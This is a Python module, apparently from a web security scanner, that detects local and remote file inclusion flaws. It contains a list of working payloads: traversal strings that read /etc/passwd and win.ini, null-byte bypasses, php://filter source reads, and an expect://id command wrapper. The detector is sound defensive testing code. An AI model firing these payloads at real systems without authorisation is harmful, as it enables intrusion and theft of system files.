import asyncio
import logging
import re
from urllib.parse import parse_qsl, urlparse

from app.core.detectors.base_detector import BaseDetector, Finding
from app.core.verification.verification_framework import HttpVerifier, URLParameterBuilder, FormPayloadBuilder
from app.models.vulnerability import OwaspCategory, SeverityLevel

logger = logging.getLogger(__name__)


class FileInclusionDetector(BaseDetector):
    name = "file_inclusion"

    fi_param_tokens = {
        "page", "file", "path", "include", "template", "doc", "dir", "load", "url", "src", "dest", "view"
    }

    # LFI proof-of-concept payloads
    LFI_PAYLOADS = [
        # Linux
        ("../../../../etc/passwd", r"root:x:0:0:", "Linux /etc/passwd LFI"),
        ("....//....//....//....//etc/passwd", r"root:x:0:0:", "Linux nested traversal LFI"),
        ("/etc/passwd", r"root:x:0:0:", "Linux absolute LFI"),
        ("../../../../../../../../etc/passwd", r"root:x:0:0:", "Linux deep traversal LFI"),
        ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", r"root:x:0:0:", "Linux URL-encoded deep traversal"),
        ("../../../../etc/passwd%00", r"root:x:0:0:", "Null-byte LFI bypass"),
        ("../../../../etc/passwd\x00.jpg", r"root:x:0:0:", "Null-byte + extension LFI bypass"),
        # Windows
        ("../../../../windows/win.ini", r"\[fonts\]|\[extensions\]", "Windows win.ini LFI"),
        ("C:\\windows\\win.ini", r"\[fonts\]|\[extensions\]", "Windows absolute win.ini LFI"),
        ("..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", r"\[fonts\]|\[extensions\]", "Windows traversal LFI"),
        # Wrapper
        ("php://filter/convert.base64-encode/resource=index.php", r"[a-zA-Z0-9+/=]{20,}", "PHP Filter Base64 LFI"),
        ("php://filter/read=convert.base64-encode/resource=../../../../etc/passwd", r"[a-zA-Z0-9+/=]{20,}", "PHP Filter Base64 Traversal LFI"),
        ("php://input", None, "PHP input stream injection"),
        ("data://text/plain;base64,U2VudHJ5VGVzdA==", r"SentryTest", "PHP data wrapper"),
        ("expect://id", r"uid=", "PHP expect wrapper"),
    ]

    RFI_PAYLOADS = [
        ("http://0.0.0.0:0/sentry_rfi_test", None, "Remote HTTP include attempt"),
        ("https://0.0.0.0:0/sentry_rfi_test", None, "Remote HTTPS include attempt"),
    ]

    async def detect(self, urls: list[str], forms: list[object], **kwargs: object) -> list[Finding]:
        findings: list[Finding] = []
        session_cookies = kwargs.get("session_cookies") or {}

        # 1. Candidate extraction using ParamDiscovery
        from app.core.crawler.param_discovery import ParamDiscovery
        
        def fi_filter(param_name: str) -> bool:
            param_lower = param_name.lower()
            return param_lower in self.fi_param_tokens or any(tok in param_lower for tok in ["file", "page", "path", "inc"])
            
        candidates = ParamDiscovery.build_candidates(
            urls, forms, filter_fn=fi_filter
        )

        if not candidates:
            return []

        # 2. Active Verification
        semaphore = asyncio.Semaphore(4)
        verifier = HttpVerifier(cookies=session_cookies)
        verifier.set_request_context(module="lfi")

        async def verify_candidate(cand) -> list[Finding]:
            if len(cand) == 5:
                cand_url, param, method, val, form_inputs = cand
            else:
                cand_url, param, method, val = cand
                form_inputs = None

            cand_findings = []

            def _build_request_args(payload: str) -> tuple[str, dict | None, dict | None]:
                if method.upper() == "POST" and form_inputs is not None:
                    data = FormPayloadBuilder.build(form_inputs, param, payload)
                    return cand_url, None, data
                return URLParameterBuilder.inject_parameter(cand_url, param, payload, method)

            async with semaphore:
                verifier.set_request_context(parameter=param)
                # Test baseline first
                try:
                    baseline_url, baseline_params, baseline_data = _build_request_args(val)
                    baseline = await verifier.send_request(
                        baseline_url, method, baseline_params, baseline_data, test_phase="baseline"
                    )

                    rfi_error_terms = re.compile(
                        r"(failed to open stream|connection refused|timed out|"
                        r"php_network_getaddresses|allow_url_include|"
                        r"failed to open|name or service not known)",
                        re.IGNORECASE,
                    )
                    wrapper_error_terms = re.compile(
                        r"(php://input|failed to open|wrapper|warning)",
                        re.IGNORECASE,
                    )
                    
                    for payload, regex_pattern, desc in self.LFI_PAYLOADS:
                        # Make sure payload isn't already matching in baseline to avoid false positives
                        if regex_pattern and re.search(regex_pattern, baseline.body, re.I):
                            continue

                        injected_url, injected_params, injected_data = _build_request_args(payload)
                        injected = await verifier.send_request(
                            injected_url, method, injected_params, injected_data,
                            test_phase="lfi_injection", payload=payload,
                        )

                        if regex_pattern and injected.status_code == 200 and re.search(regex_pattern, injected.body, re.I):
                            # Verified LFI!
                            cand_findings.append(
                                Finding(
                                    category=OwaspCategory.a01,
                                    vuln_type="Local File Inclusion (LFI)",
                                    severity=SeverityLevel.critical,
                                    url=cand_url,
                                    parameter=param,
                                    method=method,
                                    payload=payload,
                                    evidence=f"Local File Inclusion verified via payload '{payload}' ({desc}). Pattern '{regex_pattern}' matched in response.",
                                    confidence_score=95.0,
                                    detection_method="file_retrieval",
                                    reproducible=True,
                                    verified=True,
                                    verification_request_snippet=injected.request_snippet,
                                    verification_response_snippet=injected.response_snippet,
                                )
                            )
                            # Stop testing this parameter once LFI is found
                            break
                        if regex_pattern is None and injected.status_code == 200:
                            if wrapper_error_terms.search(injected.body) and not wrapper_error_terms.search(baseline.body):
                                cand_findings.append(
                                    Finding(
                                        category=OwaspCategory.a01,
                                        vuln_type="Local File Inclusion (LFI)",
                                        severity=SeverityLevel.high,
                                        url=cand_url,
                                        parameter=param,
                                        method=method,
                                        payload=payload,
                                        evidence=f"Possible wrapper-based file inclusion ({desc}).",
                                        confidence_score=70.0,
                                        detection_method="wrapper_error",
                                        reproducible=True,
                                        verified=True,
                                        verification_request_snippet=injected.request_snippet,
                                        verification_response_snippet=injected.response_snippet,
                                    )
                                )
                                break

                    for payload, _, desc in self.RFI_PAYLOADS:
                        injected_url, injected_params, injected_data = _build_request_args(payload)
                        injected = await verifier.send_request(
                            injected_url, method, injected_params, injected_data,
                            test_phase="rfi_injection", payload=payload,
                        )
                        if rfi_error_terms.search(injected.body) and not rfi_error_terms.search(baseline.body):
                            cand_findings.append(
                                Finding(
                                    category=OwaspCategory.a01,
                                    vuln_type="Remote File Inclusion (RFI)",
                                    severity=SeverityLevel.high,
                                    url=cand_url,
                                    parameter=param,
                                    method=method,
                                    payload=payload,
                                    evidence=f"Possible RFI attempt triggered error response ({desc}).",
                                    confidence_score=70.0,
                                    detection_method="remote_include",
                                    reproducible=True,
                                    verified=True,
                                    verification_request_snippet=injected.request_snippet,
                                    verification_response_snippet=injected.response_snippet,
                                )
                            )
                            break
                except Exception as e:
                    logger.error("LFI verification failed for %s param %s: %s", cand_url, param, e)
            return cand_findings

        tasks = [verify_candidate(c) for c in candidates]
        results = await asyncio.gather(*tasks)
        for res in results:
            findings.extend(res)

        await verifier.close()
        return findings
